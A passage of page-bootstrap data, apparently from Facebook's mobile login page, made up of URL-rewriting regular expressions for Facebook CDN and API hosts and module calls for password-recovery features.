                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:40696)-2($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:1997)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:9024)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:10537)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:11485)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:8221|30361|30362)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:30808)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:40696)-2($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))($|\\?.*$|/.*$)",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.webm|\\.m4v|\\.mpd)(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.webm|\\.m4v|\\.mpd)(\\?.*)?$)",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:1997)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:9024)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:10537)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:11485)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:8221|30361|30362)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:30808)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:40696)-2($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:1997)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:9024)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:10537)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:11485)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:8221|30361|30362)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:30808)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:40696)-2($|\\?.*$|/.*$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)(f\\w+-\\w+\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))($|\\?.*$|/.*$)",
                      "^(https?)://(?:z-m-|z-p3-|z-p4-)?(rupload)\\.?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})((?:/fb_video|/messenger_video|/messenger_videos|/wa-msgr/mms/video)(?:$|\\?.*$|/.*$))",
                      "^(https?)://(?:z-m-|z-p3-|z-p4-)?(rupload)\\.?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})((?:/messenger_image|/fb_photo|/wa-msgr/mms/image)(?:$|\\?.*$|/.*$))",
                      "^(https?)://(?:z-m-|z-p3-|z-p4-)?(rupload)\\.?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})((?:/messenger_gif|/wa-msgr/mms/gif)(?:$|\\?.*$|/.*$))",
                      "^(https?)://(?:z-m-|z-p3-|z-p4-)?(rupload)\\.?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})((?:/messenger_audio|/wa-msgr/mms/ptt)(?:$|\\?.*$|/.*$))",
                      "^(https?)://(?:z-m-|z-p3-|z-p4-)?(rupload)\\.?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/messenger_file(?:$|\\?.*$|/.*$))",
                      "^(https?)://(?:z-m-|z-p3-|z-p4-)?(rupload)\\.?([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                      "^(https?)://(?:z-m-|z-p3-|z-p4-)?(rupload)\\.?-\\w{3,4}\\d-\\d.up.([0-9a-zA-Z\\.-]*)?facebook\\.com((?:/fb_video|/messenger_video|/messenger_videos|/wa-msgr/mms/video)(?:$|\\?.*$|/.*$))($|\\?.*$|/.*$)",
                      "^(https?)://(\\w+)\\.(p|z)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.webm|\\.m4v|\\.mpd)(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.webm|\\.m4v|\\.mpd)(\\?.*)?$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:1997)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:9024)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:10537)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:11485)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:8221|30361|30362)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:30808)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:40696)-2($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:1997)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:9024)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:10537)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:11485)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:8221|30361|30362)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:30808)-6($|\\?.*$|/.*$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*(?:t[0-9]+\\.(?:40696)-2($|\\?.*$|/.*$)))",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:0|8|9|10|12))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:0|8|9|10|12))(/.*\\?.*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:0|8|9|10|12))(/[^\\?]*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:1))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:1))(/.*\\?.*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:1))(/[^\\?]*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:2|26|27|28|29))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:2|26|27|28|29))(/.*\\?.*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:2|26|27|28|29))(/[^\\?]*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:4))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:4))(/.*\\?.*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:4))(/[^\\?]*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:6))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:6))(/.*\\?.*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:6))(/[^\\?]*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:21))($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:21))(/.*\\?.*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))(.*)(/t[0-9\\.]+-(?:21))(/[^\\?]*$)",
                      "^(https?)://(z-1-|z-m-|z-p3-|z-p4-|)([0-9a-zA-Z\\.-]+)(\\.xx\\.fbcdn\\.net(:?[0-9]{0,5}))($|\\?.*$|/.*$)",
                      "^(https?)://(api|api2|z-m-api|api-read|z-p3-api|z-p4-api)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/message_audios(?:$|\\?.*$|/.*$))",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/messagevideoattachment(?:$|\\?.*$|/.*$))",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})((?://me/chunked_upload_sessions|//[0-9]+/chunks|/v2\\.3/[0-9]+/videos)(?:$|\\?.*$|/.*$))",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/message_images(?:$|\\?.*$|/.*$))",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/message_animated_images(?:$|\\?.*$|/.*$))",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/message_files(?:$|\\?.*$|/.*$))",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/photos(?:$|\\?.*$|/.*$))",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(.*\\?.*$)",
                      "^(https?)://(graph|graph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})([^\\?]*$)",
                      "^(https?)://(z-m-|z-1-|z-p3-|z-p4-)?(cdn|attachment|lookaside)\\.fbsbx\\.com(:?[0-9]{0,5})($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(z-m-|z-1-|z-p3-|z-p4-)?(cdn|attachment|lookaside)\\.fbsbx\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                      "^(https?)://(m|mobile|d|b-m)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/zero/toggle/settings/(?:$|\\?.*$|/.*$))",
                      "^(https?)://(free|m|mobile|d|b-m)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                      "^(https?)://(www|web|z-m-www|b-www)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                      "^(https?)://(upload|p-upload|z-upload|z-p3-upload|z-p4-upload)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                      "^(https?)://(graph-video|z-graph-video|p-graph-video|z-p3-graph-video|z-p4-graph-video)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                    ],
                    regex_replacer: [
                      "$1://z-m-api.$3facebook.com$4$5",
                      "$0",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://z-m-$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://z-m-$2$3$4$6",
                      "$1://z-m-$2$3$4$6",
                      "$1://z-m-$2$3$4$6",
                      "$1://z-m-$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://z-m-$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2xx$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2xx$4$6",
                      "$1://$2xx$4$6",
                      "$1://$2xx$4$6",
                      "$1://$2xx$4$6",
                      "$1://$2$3$4$6",
                      "$1://z-m-$2xx$4$6",
                      "$1://$2$3$4$6",
                      "$1://z-m-$2xx$4$6",
                      "$1://z-m-$2xx$4$6",
                      "$1://z-m-$2xx$4$6",
                      "$1://z-m-$2xx$4$6",
                      "$1://$2$3$4$6",
                      "$1://$2xx$4$6",
                      "$1://z-m-$2xx$4$6",
                      "$1://$2.$3facebook.com$4$5",
                      "$1://z-m-$2.$3facebook.com$4$5",
                      "$1://$2.$3facebook.com$4$5",
                      "$1://$2.$3facebook.com$4$5",
                      "$1://z-m-$2.$3facebook.com$4$5",
                      "$1://z-m-$2.$3facebook.com$4$5",
                      "$1://z-m-$2.$3facebook.com$4$5",
                      "$1://$2.z.$4facebook.com$5$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6",
                      "$1://z-m-$3$4$6",
                      "$1://$3$4$6",
                      "$1://z-m-$3$4$6",
                      "$1://z-m-$3$4$6",
                      "$1://z-m-$3$4$6",
                      "$1://z-m-$3$4$6",
                      "$1://$3$4$6",
                      "$1://$3$4$6$7$8",
                      "$1://z-m-$3$4$6$7$8&_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://z-m-$3$4$6$7$8?_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://$3$4$6$7$8",
                      "$1://z-m-$3$4$6$7$8&_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://z-m-$3$4$6$7$8?_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://$3$4$6$7$8",
                      "$1://$3$4$6$7$8&_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://$3$4$6$7$8?_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://$3$4$6$7$8",
                      "$1://z-m-$3$4$6$7$8&_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://z-m-$3$4$6$7$8?_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://$3$4$6$7$8",
                      "$1://z-m-$3$4$6$7$8&_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://z-m-$3$4$6$7$8?_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://$3$4$6$7$8",
                      "$1://$3$4$6$7$8&_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://$3$4$6$7$8?_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://z-m-$3$4$6",
                      "$1://z-m-api.$3facebook.com$4$5",
                      "$1://graph.$3facebook.com$4$5",
                      "$1://graph.$3facebook.com$4$5",
                      "$1://graph.$3facebook.com$4$5",
                      "$1://z-m-graph.$3facebook.com$4$5",
                      "$1://graph.$3facebook.com$4$5",
                      "$1://z-m-graph.$3facebook.com$4$5",
                      "$1://z-m-graph.$3facebook.com$4$5",
                      "$1://z-m-graph.$3facebook.com$4$5&_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://z-m-graph.$3facebook.com$4$5?_nc_eh=d160a02d3f1178be7fb573c272453685",
                      "$1://$3.fbsbx.com$4$5",
                      "$1://$3.fbsbx.com$4$5",
                      "$1://m.$3facebook.com$4$5",
                      "$1://m.$3facebook.com$4$5",
                      "$1://www.$3facebook.com$4$5",
                      "$1://z-upload.$3facebook.com$4$5",
                      "$1://graph-video.$3facebook.com$4$5",
                    ],
                  },
                ],
              ],
              [
                "ForgetPasswordAutoSearch@3971bd80b41fb3743920b9496c3134b0",
                "addListenerForgetPasswordAutoSearch",
                [],
                [
                  "m_login_email",
                  "m_login_auto_search_form_contactpoint_hidden_input",
                  "m_login_auto_search_form_forgot_password_button",
                ],
              ],
              [
                "MLoginController@7e57216e4f2da430b49b8824b7a79a45",
                "initAccountRecoveryFunnelLogging",
                ["__elem_8a020238_0_0_o7"],
                [
                  { __m: "__elem_8a020238_0_0_o7" },
                  "click_forget_password",
                  "o8kSYhILomTbOsVFLQK7nxD3",
                ],
              ],
              [
                "MGetInstalledRelatedApps@e130a3db3384e9b99769658f19e7be45",
                "logmTouchInstalledRelatedApps",
                [],
